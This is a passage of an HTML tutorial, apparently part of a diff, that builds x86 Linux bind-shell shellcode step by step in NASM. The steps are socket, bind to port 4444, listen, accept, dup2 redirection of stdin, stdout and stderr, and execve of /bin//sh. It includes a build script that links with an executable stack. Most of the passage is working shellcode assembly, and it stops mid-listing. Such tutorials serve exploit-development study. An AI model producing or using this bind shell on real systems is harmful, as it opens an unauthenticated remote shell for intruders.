+</code></pre></div><p>That should do it, lets call the <code>sys_bind</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>
+</code></pre></div><p>That&rsquo;s it, the bind has been called and port 4444 is now bound to our socket.</p>
+<p>The next step is to start listening on that port.</p>
+<p><!-- raw HTML omitted --></p>
+<h1 id="step-3-listen">Step 3: Listen</h1>
+<blockquote>
+<p>From this point on, you should know how to look up calls in the <a href="https://www.man7.org/linux/man-pages/">man</a> pages so we won&rsquo;t be going into as much information as before.</p>
+</blockquote>
+<p>Let&rsquo;s take a look at the <code>listen()</code> system call:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">listen() marks the socket referred to by sockfd as a passive socket,
+that is, as a socket that will be used to accept incoming connection
+requests using accept(2)
+
+Usage:
+  int listen(int sockfd, int backlog);
+</code></pre></div><p>The <code>sys_listen</code> call, value <code>4</code>, takes two arguments:</p>
+<table>
+<thead>
+<tr>
+<th>Argument</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sockfd</td>
+<td>Integer</td>
+<td>The socket file descriptor</td>
+</tr>
+<tr>
+<td>backlog</td>
+<td>Integer</td>
+<td>The maximum length to which the queue of pending connections for sockfd may grow</td>
+</tr>
+</tbody>
+</table>
+<p>We know that the <code>sockfd</code> is currently stored in <code>edx</code>.</p>
+<p>We don&rsquo;t want to set a maximum queue length so we&rsquo;ll make this value <code>0</code></p>
+<p>Our call then should look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_sockcall[102 =&gt; eax].sys_listen[4 = ebx](sockfd[edx], backlog[0])[ =&gt; ecx];
+</code></pre></div><p>Let&rsquo;s create the assembly instructions.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax </span>
+<span style="color:#a6e22e">push</span> eax             <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
+<span style="color:#a6e22e">push</span> edx             <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+<span style="color:#a6e22e">mov</span> ecx, esp         <span style="color:#75715e">; store the location of our arguments into ecx</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>         <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+<span style="color:#a6e22e">xor</span> ebx, ebx         <span style="color:#75715e">; clear value of ebx to 0</span>
+<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">4</span>           <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_listen</span>
+</code></pre></div><p>Great, now we should have a listener on port 4444 which is connected to our socket. One last step before we test if it is actually accepting connections.</p>
+<p><!-- raw HTML omitted --></p>
+<h1 id="step-4-accept">Step 4: Accept</h1>
+<p>Let&rsquo;s take a look at the <code>accept()</code> system call:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The accept() system call is used with connection-based socket types
+(SOCK_STREAM, SOCK_SEQPACKET).  It extracts the first connection
+request on the queue of pending connections for the listening socket,
+sockfd, creates a new connected socket, and returns a new file
+descriptor referring to that socket.
+
+Usage:
+  int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);`
+</code></pre></div><p>The accept call takes 3 parameters:</p>
+<table>
+<thead>
+<tr>
+<th>Argument</th>
+<th>Type</th>
+<th>Description</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sockfd</td>
+<td>Integer</td>
+<td>Our <code>socket</code> file descriptor still stored in <code>edx</code></td>
+<td></td>
+</tr>
+<tr>
+<td>addr</td>
+<td>Struct</td>
+<td>The IP address we want to accept connections from</td>
+<td></td>
+</tr>
+<tr>
+<td>addrlen</td>
+<td>Size_t</td>
+<td>The IP address length we want to accept connections from</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>These should be familiar as we&rsquo;ve used some previously in other calls.</p>
+<p>Seeing as we want to accept connections from anywhere, we&rsquo;ll leave these as <code>0</code>.</p>
+<p>So our call should look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall[102 =&gt; eax].sys_accept[5 =&gt; ebx](sockfd[edx], addr[0], addrlen[0])[ =&gt; ecx];
+</code></pre></div><p>Build this into assembly instructions</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax</span>
+<span style="color:#a6e22e">push</span> eax             <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
+<span style="color:#a6e22e">push</span> eax             <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
+<span style="color:#a6e22e">push</span> edx             <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+<span style="color:#a6e22e">mov</span> ecx, esp         <span style="color:#75715e">; move the location of our arguments into ecx</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>         <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+<span style="color:#a6e22e">xor</span> ebx, ebx         <span style="color:#75715e">; clear value of ebx</span>
+<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">5</span>           <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_accept</span>
+</code></pre></div><p>In the accept <a href="http://man7.org/linux/man-pages/man2/accept.2.html">man</a> page, it says that <code>sys_accept</code> call will return a value to us, we&rsquo;ll need to save this value for the next step.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> edx, eax          <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>
+</code></pre></div><p>Lets compile and test our code. At this point our <code>bindshell.nasm</code> file should look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start            
+
+<span style="color:#66d9ef">section</span> .text
+_start:
+
+        <span style="color:#75715e">; Start of our shellcode</span>
+
+        <span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax </span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear the value of ebx </span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">1</span>         <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
+        <span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear the value of ecx</span>
+        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>             <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>             <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; push the location of our arguments into ecx</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
+        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>
+
+        <span style="color:#75715e">; sys_bind (bind a port number to our socket)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax</span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack as it&#39;s null (INADDR_ANY = 0)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; mov value of esp into ecx, the location of our sockaddr arguments</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
+        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
+        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">2</span>         <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>
+
+        <span style="color:#75715e">; sys_listen (listen on our created socket)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax </span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
+        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; store the location of our arguments into ecx</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx to 0</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">4</span>         <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_listen</span>
+
+        <span style="color:#75715e">; sys_accept (accept connections on our created port)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
+        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the location of our arguments into ecx</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">5</span>         <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_accept</span>
+        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>
+</code></pre></div><p>We will be compiling <code>.nasm</code> files a lot so lets create a script to save time.</p>
+<p>Create a new file called <code>nassemble.sh</code> with the following code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+nasm -f elf32 -o $1.o $1.nasm
+ld -z execstack -o $1 $1.o
+</code></pre></div><p>Make the file executable and run it while passing it our file name. make sure NOT to include the <code>.nasm</code> extension as it may destroy your file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./nassemble.sh bindshell
+</code></pre></div><p><img src="http://i.imgur.com/aUTnXFt.png" alt=""></p>
+<p>Lets run our bindshell file and see if it creates a listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./bindshell
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netstat -antp
+</code></pre></div><p><img src="http://i.imgur.com/fdIpo36.png" alt=""></p>
+<p>Fantastic, we have a bind listening on port 4444 listening on any IP address. So far so good. Lets get this bind to start talking to our shell.</p>
+<p><!-- raw HTML omitted --></p>
+<h1 id="step-5-dup2">Step 5: Dup2</h1>
+<p>You know the drill&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">dup2() makes newfd be the copy of oldfd, closing newfd first if
+necessary.
+
+Usage:
+  int dup2(int oldfd, int newfd);`
+</code></pre></div><p>We are going to need some file descriptors for our socket to send and receive the responses into our execve call. We will use sys_dup2 to perform this task.</p>
+<p>sys_dup2 carries the system call value of <code>63</code>.</p>
+<p>It takes 2 arguments:</p>
+<table>
+<thead>
+<tr>
+<th>Argument</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>oldfd</td>
+<td>Integer</td>
+<td>The old file descriptor</td>
+</tr>
+<tr>
+<td>newfd</td>
+<td>Integer</td>
+<td>The new file descriptor</td>
+</tr>
+</tbody>
+</table>
+<p><!-- raw HTML omitted --></p>
+<p>The old file descriptor will be the value we just returned after executing our <code>sys_accept</code> call which we stored in <code>edx</code>.</p>
+<p>The new file descriptor will be the ones we need to create.</p>
+<p>To get shell functionality, We will need to create the following 3 descriptors:</p>
+<table>
+<thead>
+<tr>
+<th>Descriptor</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>stdin</td>
+<td>0</td>
+</tr>
+<tr>
+<td>stdout</td>
+<td>1</td>
+</tr>
+<tr>
+<td>stderr</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<p><!-- raw HTML omitted --></p>
+<p>Our call for <code>sys_dup2</code> will look like this</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_dup2[63 =&gt; eax](oldfd[edx =&gt; ebx], newfd =&gt; ecx);
+</code></pre></div><p>Build the assembly.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+<span style="color:#a6e22e">mov</span> ebx, edx          <span style="color:#75715e">; move the stored oldfd argument to ebx (currently stored in edx)</span>
+<span style="color:#a6e22e">xor</span> ecx, ecx          <span style="color:#75715e">; set ecx to 0 for stdin</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
+</code></pre></div><p>That should have created our new <code>stdin</code> file descriptor, now to create the <code>stdout</code> and <code>stderr</code> by incrementing <code>ecx</code> and recalling the <code>sys_dup2</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+<span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 1 for stdout</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
+<span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+<span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 2 for stderr</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
+</code></pre></div><p>Great, onto the last step&hellip;execve!</p>
+<h1 id="step-6-execve">Step 6: Execve</h1>
+<p>One more time&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">execve() executes the program pointed to by filename.  filename must
+be either a binary executable, or a script.
+
+Usage:
+  int execve(const char *filename, char *const argv[], char *const envp[]);`
+</code></pre></div><p>Execve takes 3 arguments:</p>
+<table>
+<thead>
+<tr>
+<th>Argument</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>filename</td>
+<td>Char</td>
+<td>The filename of the executable we want to run</td>
+</tr>
+<tr>
+<td>argv[]</td>
+<td>Array</td>
+<td>The arguments to pass to the executable</td>
+</tr>
+<tr>
+<td>envp[]</td>
+<td>Array</td>
+<td>The array of environment strings passed to the executable as environment variables</td>
+</tr>
+</tbody>
+</table>
+<p><!-- raw HTML omitted --></p>
+<blockquote>
+<p>For filename, we will use a simple <code>/bin/sh</code>, however, to keep our code neat, let&rsquo;s instead use <code>/bin//sh</code></p>
+</blockquote>
+<p>This will keep our code at 8 chars which will line up neatly on the stack and essentially makes no difference to the operating system.</p>
+<p>We are not going to be passing any arguments or environment settings to the executable so we will just push NULL to the stack for these two arguments.</p>
+<p>Our call should look something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_execve[11 =&gt; eax](filename[/bin//sh location on stack =&gt; ebx], argv[][0 =&gt; ecx], envp[0 =&gt;edx]);
+</code></pre></div><p>To get the hex value of your <code>/bin//sh</code> create a new file called <code>text2stack.py</code> with the following contents:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> struct
+
+a <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&amp;lt;L&#39;</span>, str(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]))
+
+<span style="color:#66d9ef">print</span> hex(a[<span style="color:#ae81ff">0</span>])
+</code></pre></div><p>Run the code to pull out two sets of 4 chars.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./text2stack.py /bin
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./text2stack.py //sh
+</code></pre></div><p>Build the last part of your assembly instructions using these new values returned by the script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> ecx, ecx         <span style="color:#75715e">; clear value of ecx, args argument = 0</span>
+<span style="color:#a6e22e">push</span> ecx             <span style="color:#75715e">; push a null to the stack to terminate our filename</span>
+<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>      <span style="color:#75715e">; push //sh to the stack (second part of /bin//sh)</span>
+<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>      <span style="color:#75715e">; push /bin to the stack (first part of /bin//sh</span>
+<span style="color:#a6e22e">mov</span> ebx, esp         <span style="color:#75715e">; set ebx with the location of our file name on the stack</span>
+<span style="color:#a6e22e">mov</span> edx, ecx         <span style="color:#75715e">; move null value for envp argument into edx</span>
+<span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">11</span>          <span style="color:#75715e">; sets the value 11 which is the syscall number for sys_execve</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_execve</span>
+</code></pre></div><p>Our completed code should now look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start            
+
+<span style="color:#66d9ef">section</span> .text
+_start:
+
+        <span style="color:#75715e">; Start of our shellcode</span>
+
+        <span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax </span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear the value of ebx </span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">1</span>         <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
+        <span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear the value of ecx</span>
+        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>             <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>             <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; push the location of our arguments into ecx</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
+        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>
+
+        <span style="color:#75715e">; sys_bind (bind a port number to our socket)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax</span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack as it&#39;s null (INADDR_ANY = 0)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; mov value of esp into ecx, the location of our sockaddr arguments</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
+        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
+        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">2</span>         <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>
+
+        <span style="color:#75715e">; sys_listen (listen on our created socket)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax </span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
+        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; store the location of our arguments into ecx</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx to 0</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">4</span>         <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_listen</span>
+
+        <span style="color:#75715e">; sys_accept (accept connections on our created port)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
+        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
+        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the location of our arguments into ecx</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">5</span>         <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_accept</span>
+        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>
+
+        <span style="color:#75715e">; sys_dup2 (create file descriptors for stdin, stdout and stderr so we can see the responses from execve)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+        <span style="color:#a6e22e">mov</span> ebx, edx          <span style="color:#75715e">; move the stored oldfd argument to ebx (stored in edx)</span>
+        <span style="color:#a6e22e">xor</span> ecx, ecx          <span style="color:#75715e">; set ecx to 0 for stdin</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
+        <span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+        <span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 1 for stdout</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
+        <span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
